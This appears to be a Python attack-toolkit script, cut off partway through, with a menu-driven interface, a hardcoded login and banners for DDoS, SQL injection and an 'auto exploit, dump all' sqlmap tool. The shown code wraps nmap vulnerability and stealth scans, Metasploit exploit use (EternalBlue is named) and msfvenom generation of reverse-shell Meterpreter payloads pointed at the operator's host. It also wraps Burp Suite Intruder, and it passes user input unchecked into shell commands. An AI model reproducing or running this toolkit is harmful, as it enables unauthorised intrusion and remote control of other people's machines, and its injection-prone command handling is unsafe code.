#!/usr/bin/env python3
import os
import sys
import time
import socket
import subprocess
import requests
import threading
import random
import datetime
import urllib.parse
import re
import json
import xml.etree.ElementTree as ET
from colorama import Fore, Style, init

init(autoreset=True)

USERNAME = "mrzxx"
PASSWORD = "123456"

# ASCII Arts (tidak berubah kecuali yang diminta)
LOGIN_ASCII = Fore.GREEN + """
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""" + Style.RESET_ALL

MAIN_ASCII = Fore.WHITE + """
⣿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣛⣛⣛⣛⣛⣛⣛⣛⡛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣿
⣿⠀⠀⠀⠀⢀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣀⠀⠀⠀⠀⣿
⣿⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⣿
⣿⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⠀⠈⢻⣿⠿⠛⠛⠛⠛⠛⢿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠛⠻⣿⣿⠋⠀⣿
⣿⠛⠁⢸⣥⣴⣾⣿⣷⣦⡀⠀⠈⠛⣿⣿⠛⠋⠀⢀⣠⣾⣿⣷⣦⣤⡿⠈⢉⣿
⣿⢋⣩⣼⡿⣿⣿⣿⡿⠿⢿⣷⣤⣤⣿⣿⣦⣤⣴⣿⠿⠿⣿⣿⣿⢿⣷⣬⣉⣿
⣿⣿⣿⣿⣷⣿⡟⠁⠀⠀⠀⠈⢿⣿⣿⣿⢿⣿⠋⠀⠀⠀⠈⢻⣿⣧⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣥⣶⣶⣶⣤⣴⣿⡿⣼⣿⡿⣿⣇⣤⣴⣶⣶⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡿⢛⣿⣿⣿⣿⣿⣿⡿⣯⣾⣿⣿⣿⣮⣿⣿⣿⣿⣿⣿⣿⡟⠿⣿⣿⣿
⣿⣿⡏⠀⠸⣿⣿⣿⣿⣿⠿⠓⠛⢿⣿⣿⡿⠛⠛⠻⢿⣿⣿⣿⣿⡇⠀⠹⣿⣿
⣿⣿⡁⠀⠀⠈⠙⠛⠉⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠈⠙⠛⠉⠀⠀⠀⣿⣿
⣿⠛⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⠛⣿
⣿⠀⠈⢳⣶⣤⣤⣤⣤⡄⠀⠀⠠⠤⠤⠤⠤⠤⠀⠀⢀⣤⣤⣤⣤⣴⣾⠃⠀⣿
⣿⠀⠀⠈⣿⣿⣿⣿⣿⣿⣦⣀⡀⠀⠀⠀⠀⠀⣀⣤⣾⣿⣿⣿⣿⣿⠇⠀⠀⣿
⣿⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣿
⣿⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⣿
⣿⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠀⣿
⣿⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⣿
⠛⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⠛⠉⠉⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠛
⠀⠀⠀⣶⡶⠆⣴⡿⡖⣠⣾⣷⣆⢠⣶⣿⣆⣶⢲⣶⠶⢰⣶⣿⢻⣷⣴⡖⠀⠀
⠀⠀⢠⣿⣷⠂⠻⣷⡄⣿⠁⢸⣿⣿⡏⠀⢹⣿⢸⣿⡆⠀⣿⠇⠀⣿⡟⠀⠀⠀
⠀⠀⢸⣿⠀⠰⣷⡿⠃⠻⣿⡿⠃⠹⣿⡿⣸⡏⣾⣷⡆⢠⣿⠀⠀⣿⠃⠀⠀⠀
""" + Style.RESET_ALL

WELCOME_ASCII = Fore.CYAN + """
██╗    ██╗███████╗██╗     ██╗      ██████╗ ██████╗ ███╗   ███╗███████╗    
██║    ██║██╔════╝██║     ██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝    
██║ █╗ ██║█████╗  ██║     ██║     ██║     ██║   ██║██╔████╔██║█████╗      
██║███╗██║██╔══╝  ██║     ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝      
╚███╔███╔╝███████╗███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗    
 ╚══╝╚══╝ ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝    
""" + Style.RESET_ALL

DDOS_ASCII = Fore.RED + """
██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║  ██║██║  ██║██║   ██║███████╗
██║  ██║██║  ██║██║   ██║╚════██║
██████╔╝██████╔╝╚██████╔╝███████║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
""" + Style.RESET_ALL

SQL_INJECT_ASCII = Fore.YELLOW + """
███████╗ ██████╗ ██╗     ██╗███╗   ██╗ ██████╗███████╗ ██████╗████████╗
██╔════╝██╔═══██╗██║     ██║████╗  ██║██╔════╝██╔════╝██╔═══██╗╚══██╔══╝
███████╗██║   ██║██║     ██║██╔██╗ ██║██║     █████╗  ██║   ██║   ██║   
╚════██║██║   ██║██║     ██║██║╚██╗██║██║     ██╔══╝  ██║   ██║   ██║   
███████║╚██████╔╝███████╗██║██║ ╚████║╚██████╗██║     ╚██████╔╝   ██║   
╚══════╝ ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝╚═╝      ╚═════╝    ╚═╝   
""" + Style.RESET_ALL

SQLMAP_ASCII = Fore.GREEN + """
╔══════════════════════════════════════════════════════════╗
║    ███████╗ ██████╗ ██╗    ███╗   ███╗ █████╗ ██████╗   ║
║    ╚══███╔╝██╔═══██╗██║    ████╗ ████║██╔══██╗██╔══██╗  ║
║      ███╔╝ ██║   ██║██║    ██╔████╔██║███████║██████╔╝  ║
║     ███╔╝  ██║   ██║██║    ██║╚██╔╝██║██╔══██║██╔═══╝   ║
║    ███████╗╚██████╔╝██║    ██║ ╚═╝ ██║██║  ██║██║       ║
║    ╚══════╝ ╚═════╝ ╚═╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝       ║
║                                                          ║
║    ╔══════════════════════════════════════════════════╗  ║
║    ║         SQLMAP INJECTION TOOL v2.0               ║  ║
║    ║    100% WORKING - AUTO EXPLOIT - DUMP ALL        ║  ║
║    ╚══════════════════════════════════════════════════╝  ║
╚══════════════════════════════════════════════════════════╝
""" + Style.RESET_ALL

PORT_SCAN_ASCII = Fore.CYAN + """
██████╗  ██████╗ ██████╗ ████████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║
██████╔╝██║   ██║██████╔╝   ██║       ███████╗██║     ███████║██╔██╗ ██║
██╔═══╝ ██║   ██║██╔══██╗   ██║       ╚════██║██║     ██╔══██║██║╚██╗██║
██║     ╚██████╔╝██║  ██╗   ██║       ███████║╚██████╗██║  ██║██║ ╚████║
╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝       ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
""" + Style.RESET_ALL

NMAP_ASCII = Fore.MAGENTA + """
888b    888                                 
8888b   888                                 
88888b  888                                 
888Y88b 888 88888b.d88b.   8888b.  88888b.  
888 Y88b888 888 "888 "88b     "88b 888 "88b 
888  Y88888 888  888  888 .d888888 888  888 
888   Y8888 888  888  888 888  888 888 d88P 
888    Y888 888  888  888 "Y888888 88888P"  
                                   888      
                                   888      
                                   888      
""" + Style.RESET_ALL

METASPLOIT_ASCII = Fore.RED + """
                                                                             
                                                                             
                                                                             
                                                            #***#*                               #                                      
                                                        *#*#####%#*        #%##%###*#****##%#***##%%             --=++       --===+     
                                                        ###*#*#*### #####*## ## ########### ##########                                  
                                   ---+=+             *#*****###%####*****#######******#######*#***###%@         *-=--   -----==+====++ 
                               =+++++**+++==          * ####****#*#****#*##*#**##%#   *##**####*# ##*## @@@               ==+***+    +  
                             ---=-==+=+*==-             *%*##%%%#*                     #%%%##******                        ===+=        
   -=-- ====   =+=    :==++++=-  --=++*-  =----=+++++=                           ***##*#  ###      :==++            ==-=    =+++==      
  ----======++==+=== ---=++++=-=  -=++*   -----=+++++=+                     #####******##*        -:===+            -+-=+   =+++=       
  ===+=++++++=+***+ =-=+    ##** ==##*# ++===+*  #####                 *####%%## **%@            --=++  +====+++++ +=+++++  #####       
  -+-==   *=#  #*+ +-:-=+**+*#+  -=**#  =+=:-    #*###*           @ @%%#****##%*##              --:==+ +==---====+= +*++==+ *##*##      
 ==*===   =** *#**  -=+*#        ==*#%  +++--     *##%#    @%##%#######%@@@ +++=+=   ==*=*+    =-==+= -=++=+  ++*### *+*###  ###%##     
  +++++   ++##  ###  =++##        ++##%% ++++++   *##%%%%  @%%#%##**####%%   ++++*+* *++*+***+  ==+++  ++*++    *#### **##%    #%%%%     
+===*==  =+**##  ####*=+=+**#*#### +*##%%#*+-****##   @@%****###%%*#*@%       ++=+===    #####* +===+=++*#**   #*#%%% %#####             
*+++++   +**###% %%##  =++####%#     *%%#  + ****   %@@@@#*****#*              - +++     **#%##  ++++  +*###   ##%%%% ##%%%%             
                                             @%%%#######*#**#*                  ++=-+   #*##*#  ****###%########%#%                     
                                                 #####% % %                                                                             
                                       @@%#***#*###%%#%                         +====**#*#%%@     *##%%%                  ######*##     
                                     **#%##@#%#%**** *                               @                       %## ##%###%####%## *####   
                                   %%#%##*#****%#%                           ***+=-+#             **####***%****######*#**#*###*%*##*   
                                *#*#########*##                                   @****#########################*##################%    
                             @%%***#*####*#**                       @ @ %@#*###%#%%#***#######*#****######*#****######*#**#*#*###**     
                          #*##%%%%%#*#####               @@*#*#*######*#**#*######*#**#*#*#%####**#*##*#*######*#**#%%%%%%#######%%     
                        %%%##*+****#####        %%% @@@%@%%*###%%#%*#**#*##%#%%##**#*#*#######*#***#######*#*#*#*###*********##*#*      
                    @#*#**#*##*#******######*#****#*###%###*****#*#%###*****#**%###*#***%%*#@@@%%%@@@@   %%%%@@@@%%@ ######*#**#%       
                   @%%*#**#*###*##*#**#####*##*#**#*#*#*####**#*#*#*####**#*#**#####*##*%%*#@@@%%%@@ @             %####*##*####        
                                                                                                                  *#*##*#*##*#%         
***#*#************                                                                                               %##*#*#*##*#*          
                                                                                                               *#**#*###*##*%@          
                                                                                                                     #######            
                                                                                                           %#%#****#*#**#*#             
                                                                                                               # ## #####%              
                                                                                                           @#%#******#***               
                                                                                                                    *                   
                                                                                                   # #* %   #%## #***#*#*### ## # ##    
                                                                                                     #                                  
                                                                                                        *##%#### *##*#*##### #  *    #* 
                                                                                                           @@       @@@  @@             
""" + Style.RESET_ALL

BURP_SUITE_ASCII = Fore.CYAN + """
      $$\                       $$\                               $$\ $$\           
      $$ |                      $$ |                              $$ |$$ |          
 $$$$$$$ | $$$$$$\   $$$$$$$\ $$$$$$\    $$$$$$\   $$$$$$\   $$$$$$$ |$$ |$$\   $$\ 
$$  __$$ |$$  __$$\ $$  _____|\_$$  _|   \____$$\ $$  __$$\ $$  __$$ |$$ |$$ |  $$ |
$$ /  $$ |$$$$$$$$ |\$$$$$$\    $$ |     $$$$$$$ |$$ |  \__|$$ /  $$ |$$ |$$ |  $$ |
$$ |  $$ |$$   ____| \____$$\   $$ |$$\ $$  __$$ |$$ |      $$ |  $$ |$$ |$$ |  $$ |
\$$$$$$$ |\$$$$$$$\ $$$$$$$  |  \$$$$  |\$$$$$$$ |$$ |      \$$$$$$$ |$$ |\$$$$$$$ |
 \_______| \_______|\_______/    \____/  \_______|\__|       \_______|\__| \____$$ |
                                                                          $$\   $$ |
                                                                          \$$$$$$  |
                                                                           \______/ 
""" + Style.RESET_ALL

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_welcome():
    clear_screen()
    print(Fore.GREEN + "=" * 70)
    print(WELCOME_ASCII)
    print(Fore.GREEN + "=" * 70)
    time.sleep(2)

def login():
    clear_screen()
    print(LOGIN_ASCII)
    print(Fore.GREEN + " " * 20 + "LOGIN SYSTEM")
    print(Fore.GREEN + "=" * 50)
    
    attempts = 3
    while attempts > 0:
        username = input(Fore.YELLOW + "[?] Username: " + Fore.WHITE)
        password = input(Fore.YELLOW + "[?] Password: " + Fore.WHITE)
        
        if username == USERNAME and password == PASSWORD:
            return username
        else:
            attempts -= 1
            print(Fore.RED + f"[!] Wrong credentials! {attempts} attempts remaining")
            time.sleep(1)
    
    return None

def show_user_info(username):
    now = datetime.datetime.now()
    print(Fore.GREEN + "=" * 70)
    print(Fore.CYAN + f" Hallo: {username}")
    print(Fore.CYAN + f" Tanggal: {now.strftime('%d %B %Y')}")
    print(Fore.CYAN + f" Waktu: {now.strftime('%H:%M:%S')}")
    print(Fore.CYAN + f" Creator: mrzxx")
    print(Fore.CYAN + f" Telegram: @Zxxtirwd")
    print(Fore.GREEN + "=" * 70)

# =============================================
# ULTRA NMAP SCANNER (REAL NMAP ENGINE)
# =============================================
def nmap_scanner():
    clear_screen()
    print(NMAP_ASCII)
    print(Fore.MAGENTA + " " * 25 + "PROFESSIONAL NMAP SCANNER")
    print(Fore.GREEN + "=" * 70)
    
    # Check nmap installation
    try:
        result = subprocess.run(["nmap", "--version"], capture_output=True, text=True, timeout=5)
        if "Nmap" not in result.stdout:
            raise FileNotFoundError
        version_line = result.stdout.split('\n')[0]
        print(Fore.GREEN + f"[+] {version_line}")
    except:
        print(Fore.RED + "[✗] Nmap not found!")
        print(Fore.YELLOW + "[!] Install nmap first:")
        print(Fore.CYAN + "    Linux: sudo apt install nmap")
        print(Fore.CYAN + "    Termux: pkg install nmap")
        print(Fore.CYAN + "    Windows: Download from https://nmap.org/download.html")
        input(Fore.YELLOW + "\n[?] Press Enter to continue...")
        return
    
    target = input(Fore.YELLOW + "\n[?] Target (IP/Domain): " + Fore.WHITE).strip()
    
    if not target:
        print(Fore.RED + "[!] Target cannot be empty")
        return
    
    print(Fore.CYAN + "\n[+] Select Scan Type:")
    print(Fore.YELLOW + "[1]  Quick Scan (Top 100 ports)")
    print(Fore.YELLOW + "[2]  Full Port Scan (1-65535)")
    print(Fore.YELLOW + "[3]  OS Detection + Version")
    print(Fore.YELLOW + "[4]  Aggressive Scan (All features)")
    print(Fore.YELLOW + "[5]  Vulnerability Scan")
    print(Fore.YELLOW + "[6]  UDP Port Scan")
    print(Fore.YELLOW + "[7]  Network Discovery")
    print(Fore.YELLOW + "[8]  Stealth Scan")
    print(Fore.YELLOW + "[9]  Custom Nmap Command")
    print(Fore.YELLOW + "[10] Advanced Script Scan")
    print(Fore.GREEN + "-" * 70)
    
    choice = input(Fore.CYAN + "[?] Select option (1-10): " + Fore.WHITE).strip()
    
    commands = {
        '1': f"nmap -T4 -F {target}",
        '2': f"nmap -T4 -p- {target}",
        '3': f"nmap -T4 -O -sV {target}",
        '4': f"nmap -T4 -A {target}",
        '5': f"nmap -T4 --script vuln {target}",
        '6': f"nmap -T4 -sU -p 53,67,68,69,123,161 {target}",
        '7': f"nmap -T4 -sn {target}/24",
        '8': f"nmap -T4 -sS {target}",
        '10': f"nmap -T4 --script=default,safe,vuln {target}"
    }
    
    if choice == '9':
        custom = input(Fore.YELLOW + "[?] Custom nmap command: " + Fore.WHITE).strip()
        command = f"nmap {custom}"
    elif choice in commands:
        command = commands[choice]
    else:
        print(Fore.RED + "[!] Invalid choice")
        return
    
    # Output options
    print(Fore.CYAN + "\n[+] Output Options:")
    print(Fore.YELLOW + "[1] Show in terminal only")
    print(Fore.YELLOW + "[2] Save to file (txt)")
    print(Fore.YELLOW + "[3] Save to file (xml)")
    print(Fore.YELLOW + "[4] Save to file (all formats)")
    output_choice = input(Fore.CYAN + "[?] Select output (1-4): " + Fore.WHITE).strip() or "1"
    
    filename = f"nmap_scan_{target.replace('.', '_')}_{int(time.time())}"
    
    if output_choice == "2":
        command += f" -oN {filename}.txt"
    elif output_choice == "3":
        command += f" -oX {filename}.xml"
    elif output_choice == "4":
        command += f" -oA {filename}"
    
    print(Fore.CYAN + f"\n[+] Command: {command}")
    print(Fore.YELLOW + "[!] Scanning may take several minutes...")
    print(Fore.GREEN + "=" * 70)
    
    try:
        print(Fore.CYAN + "\n[+] Nmap Output:\n")
        
        process = subprocess.Popen(
            command.split(),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True,
            bufsize=1
        )
        
        # Real-time colored output
        for line in iter(process.stdout.readline, ''):
            line = line.strip()
            if not line:
                continue
                
            # Color coding
            if "Nmap scan report" in line:
                print(Fore.CYAN + line)
            elif "open" in line and "port" in line:
                print(Fore.GREEN + line)
            elif "closed" in line:
                print(Fore.RED + line)
            elif "filtered" in line:
                print(Fore.YELLOW + line)
            elif "PORT" in line and "STATE" in line:
                print(Fore.MAGENTA + line)
            elif "SERVICE" in line:
                print(Fore.MAGENTA + line)
            elif "VULNERABLE" in line:
                print(Fore.RED + "⚠ " + line)
            elif "CVE-" in line:
                print(Fore.RED + "  " + line)
            elif "MAC Address" in line:
                print(Fore.CYAN + line)
            elif "Nmap done" in line:
                print(Fore.GREEN + line)
            elif "Warning" in line:
                print(Fore.YELLOW + line)
            elif "Error" in line:
                print(Fore.RED + line)
            else:
                print(Fore.WHITE + line)
        
        print(Fore.GREEN + "\n" + "=" * 70)
        print(Fore.GREEN + "[✓] Nmap scan completed!")
        
        if output_choice in ["2", "3", "4"]:
            print(Fore.CYAN + f"[+] Results saved to: {filename}.*")
            
            # Parse and show summary if XML exists
            xml_file = f"{filename}.xml"
            if os.path.exists(xml_file):
                try:
                    tree = ET.parse(xml_file)
                    root = tree.getroot()
                    
                    # Extract scan summary
                    hosts = root.findall(".//host")
                    open_ports = root.findall(".//port")
                    services = set()
                    
                    for service in root.findall(".//service"):
                        name = service.get('name', 'unknown')
                        if name != 'unknown':
                            services.add(name)
                    
                    print(Fore.CYAN + "\n[+] Scan Summary:")
                    print(Fore.CYAN + f"    • Hosts scanned: {len(hosts)}")
                    print(Fore.CYAN + f"    • Open ports: {len(open_ports)}")
                    if services:
                        print(Fore.CYAN + f"    • Services found: {', '.join(sorted(services))}")
                    
                    # Show vulnerabilities if any
                    vulns = root.findall(".//script[@id='vuln']")
                    if vulns:
                        print(Fore.RED + f"    • Vulnerabilities detected: {len(vulns)}")
                        
                except Exception as e:
                    print(Fore.YELLOW + f"[!] Could not parse XML: {str(e)}")
        
    except KeyboardInterrupt:
        print(Fore.RED + "\n[✗] Scan interrupted by user")
    except Exception as e:
        print(Fore.RED + f"\n[✗] Error: {str(e)}")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

# =============================================
# METASPLOIT FRAMEWORK INTERFACE (REAL MSF)
# =============================================
def metasploit_framework():
    clear_screen()
    print(METASPLOIT_ASCII)
    print(Fore.RED + " " * 20 + "METASPLOIT FRAMEWORK INTERFACE")
    print(Fore.GREEN + "=" * 70)
    
    print(Fore.YELLOW + "[!] WARNING: Metasploit is for LEGAL penetration testing only!")
    print(Fore.YELLOW + "[!] You must have explicit written permission before use!\n")
    
    # Check if Metasploit is installed
    msf_paths = [
        "/usr/bin/msfconsole",
        "/opt/metasploit/msfconsole",
        "/usr/local/bin/msfconsole"
    ]
    
    msf_installed = False
    for path in msf_paths:
        if os.path.exists(path):
            msf_installed = True
            print(Fore.GREEN + f"[+] Metasploit found at: {path}")
            break
    
    if not msf_installed:
        print(Fore.RED + "[✗] Metasploit not found!")
        print(Fore.CYAN + "\n[+] Installation instructions:")
        print(Fore.YELLOW + "    1. Kali Linux: Already installed")
        print(Fore.YELLOW + "    2. Ubuntu/Debian: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall")
        print(Fore.YELLOW + "    3. Termux: pkg install unstable-repo && pkg install metasploit")
        print(Fore.YELLOW + "    4. Windows: Download from https://www.metasploit.com/")
        input(Fore.YELLOW + "\n[?] Press Enter to continue...")
        return
    
    print(Fore.CYAN + "\n[+] Metasploit Options:")
    print(Fore.YELLOW + "[1] Start Metasploit Console")
    print(Fore.YELLOW + "[2] Search Exploits")
    print(Fore.YELLOW + "[3] Use Exploit")
    print(Fore.YELLOW + "[4] Use Payload")
    print(Fore.YELLOW + "[5] List Auxiliary Modules")
    print(Fore.YELLOW + "[6] Database Operations")
    print(Fore.YELLOW + "[7] Generate Payload")
    print(Fore.YELLOW + "[8] Custom Metasploit Command")
    print(Fore.GREEN + "-" * 70)
    
    choice = input(Fore.CYAN + "[?] Select option (1-8): " + Fore.WHITE).strip()
    
    if choice == "1":
        print(Fore.CYAN + "\n[+] Starting Metasploit Console...")
        print(Fore.YELLOW + "[!] Use 'exit' to return to main menu")
        os.system("msfconsole")
        
    elif choice == "2":
        search_term = input(Fore.YELLOW + "[?] Search term (e.g., 'windows smb', 'apache'): " + Fore.WHITE).strip()
        if search_term:
            cmd = f"msfconsole -q -x 'search {search_term}; exit'"
            os.system(cmd)
    
    elif choice == "3":
        exploit = input(Fore.YELLOW + "[?] Exploit path (e.g., exploit/windows/smb/ms17_010_eternalblue): " + Fore.WHITE).strip()
        if exploit:
            cmd = f"msfconsole -q -x 'use {exploit}; info; exit'"
            os.system(cmd)
    
    elif choice == "7":
        print(Fore.CYAN + "\n[+] Payload Generator:")
        lhost = input(Fore.YELLOW + "[?] LHOST (Your IP): " + Fore.WHITE).strip()
        lport = input(Fore.YELLOW + "[?] LPORT (4444): " + Fore.WHITE).strip() or "4444"
        payload = input(Fore.YELLOW + "[?] Payload type (windows/meterpreter/reverse_tcp): " + Fore.WHITE).strip() or "windows/meterpreter/reverse_tcp"
        format_type = input(Fore.YELLOW + "[?] Format (exe, raw, python, php): " + Fore.WHITE).strip() or "exe"
        
        output_file = f"payload_{int(time.time())}.{format_type}"
        cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format_type} -o {output_file}"
        
        print(Fore.CYAN + f"\n[+] Generating payload: {cmd}")
        os.system(cmd)
        
        if os.path.exists(output_file):
            size = os.path.getsize(output_file)
            print(Fore.GREEN + f"[✓] Payload generated: {output_file} ({size} bytes)")
        else:
            print(Fore.RED + "[✗] Failed to generate payload")
    
    elif choice == "8":
        msf_command = input(Fore.YELLOW + "[?] Metasploit command: " + Fore.WHITE).strip()
        if msf_command:
            cmd = f"msfconsole -q -x '{msf_command}; exit'"
            os.system(cmd)
    
    else:
        print(Fore.RED + "[!] Feature requires direct msfconsole access")
        print(Fore.YELLOW + "[!] Starting Metasploit Console...")
        os.system("msfconsole")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

# =============================================
# BURP SUITE INTERFACE (REAL BURP)
# =============================================
def burp_suite():
    clear_screen()
    print(BURP_SUITE_ASCII)
    print(Fore.CYAN + " " * 25 + "BURP SUITE PROFESSIONAL")
    print(Fore.GREEN + "=" * 70)
    
    print(Fore.YELLOW + "[!] Burp Suite is a professional web vulnerability scanner")
    print(Fore.YELLOW + "[!] Community Edition is free, Professional requires license\n")
    
    # Check if Burp Suite is installed
    burp_paths = [
        "/usr/bin/burpsuite",
        "/usr/local/bin/burpsuite",
        "/opt/BurpSuiteCommunity/burpsuite_community.jar",
        "/usr/share/burpsuite/burpsuite.jar"
    ]
    
    burp_installed = False
    burp_path = ""
    for path in burp_paths:
        if os.path.exists(path):
            burp_installed = True
            burp_path = path
            print(Fore.GREEN + f"[+] Burp Suite found at: {path}")
            break
    
    if not burp_installed:
        print(Fore.RED + "[✗] Burp Suite not found!")
        print(Fore.CYAN + "\n[+] Installation instructions:")
        print(Fore.YELLOW + "    1. Download from: https://portswigger.net/burp/releases")
        print(Fore.YELLOW + "    2. Community Edition is free")
        print(Fore.YELLOW + "    3. Java required: sudo apt install default-jre")
        print(Fore.YELLOW + "\n[+] Quick install (Linux):")
        print(Fore.CYAN + "    wget 'https://portswigger.net/burp/releases/download?product=community&version=2023.12.1&type=Jar' -O burpsuite_community.jar")
        print(Fore.CYAN + "    java -jar burpsuite_community.jar")
        input(Fore.YELLOW + "\n[?] Press Enter to continue...")
        return
    
    print(Fore.CYAN + "\n[+] Burp Suite Options:")
    print(Fore.YELLOW + "[1] Start Burp Suite (GUI)")
    print(Fore.YELLOW + "[2] Start Burp Suite (Headless)")
    print(Fore.YELLOW + "[3] Configure Proxy Settings")
    print(Fore.YELLOW + "[4] Generate CA Certificate")
    print(Fore.YELLOW + "[5] Run Spider")
    print(Fore.YELLOW + "[6] Run Active Scan")
    print(Fore.YELLOW + "[7] Intruder Attack")
    print(Fore.GREEN + "-" * 70)
    
    choice = input(Fore.CYAN + "[?] Select option (1-7): " + Fore.WHITE).strip()
    
    if choice == "1":
        print(Fore.CYAN + "\n[+] Starting Burp Suite GUI...")
        if burp_path.endswith(".jar"):
            os.system(f"java -jar {burp_path} &")
        else:
            os.system(f"{burp_path} &")
        print(Fore.GREEN + "[✓] Burp Suite started in background")
    
    elif choice == "2":
        project_file = input(Fore.YELLOW + "[?] Project file name (optional): " + Fore.WHITE).strip()
        target = input(Fore.YELLOW + "[?] Target URL: " + Fore.WHITE).strip()
        
        cmd = f"java -jar {burp_path} --project-file={project_file}.burp --unpause-spider-and-scanner"
        if target:
            cmd += f" --crawl={target}"
        
        print(Fore.CYAN + f"\n[+] Command: {cmd}")
        print(Fore.YELLOW + "[!] Starting headless scan...")
        os.system(cmd)
    
    elif choice == "3":
        print(Fore.CYAN + "\n[+] Burp Suite Proxy Settings:")
        print(Fore.YELLOW + "    Default Proxy: 127.0.0.1:8080")
        print(Fore.YELLOW + "    HTTPS requires installing CA certificate")
        print(Fore.CYAN + "\n[+] Configure browser to use:")
        print(Fore.YELLOW + "    HTTP Proxy: 127.0.0.1:8080")
        print(Fore.YELLOW + "    SSL Proxy: 127.0.0.1:8080")
    
    elif choice == "4":
        print(Fore.CYAN + "\n[+] Generating CA Certificate...")
        cert_dir = os.path.expanduser("~/.burpsuite")
        os.makedirs(cert_dir, exist_ok=True)
        
        # Try to extract certificate from running Burp
        cert_cmd = f"java -jar {burp_path} --help 2>&1 | grep -i cert || echo 'Start Burp GUI to export certificate'"
        os.system(cert_cmd)
        
        print(Fore.CYAN + "\n[+] To install certificate in browser:")
